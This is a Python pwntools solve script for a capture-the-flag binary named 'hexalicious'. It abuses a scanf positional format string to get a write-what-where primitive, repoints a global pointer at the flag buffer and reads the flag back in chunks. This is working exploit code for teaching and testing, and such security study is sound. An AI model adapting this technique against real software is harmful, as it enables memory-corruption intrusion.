#!/usr/bin/env python3
# python3 port. choice 0 selects formats[-1], which aliases locals.name; name is
# set to a scanf positional "%N$x", giving a write-what-where: the value parsed
# from input is stored through a pointer we place in the input buffer. We point
# the global `data` at the flag buffer and read it back via the "As hex" print.
import sys, os, re
from pwn import ELF, remote, context, p32, p64
HOST=os.environ.get('HOST', sys.argv[1] if len(sys.argv)>1 else '127.0.0.1')
PORT=int(os.environ.get('PORT', sys.argv[2] if len(sys.argv)>2 else 18004))
exe=ELF(".build/hexalicious" if os.path.exists(".build/hexalicious") else "hexalicious"); context.binary=exe; context.log_level='error'
ARG=29; OFF=56
def do_scanf(r,data):
    r.recvuntil(b"Quit hexalicious\n\n[>] "); r.sendline(b"0")
    r.recvuntil(b"Enter your data:\n[>] "); r.sendline(data)
def write32(r,addr,value):
    vs=("%x " % value).encode()
    payload=bytearray(b"C"*60)
    payload[:len(vs)]=vs
    payload[OFF:OFF+4]=p32(addr)
    do_scanf(r, bytes(payload))
def read64(r,addr):
    write32(r, exe.symbols["data"], addr)
    r.recvuntil(b"As hex, your data looks like this: ")
    return int(r.recvline(),16)
r=remote(HOST,PORT)
r.recvuntil(b"what shall I call you?\n")
r.sendline(("%%%d$x" % ARG).encode())
flag=b""
for i in range(0,100,8):
    chunk=p64(read64(r, exe.symbols["flag"]+i))
    flag+=chunk
    if b"\0" in chunk: break
m=re.search(rb'sun\{[^}]*\}', flag)
print(m.group(0).decode() if m else repr(flag))
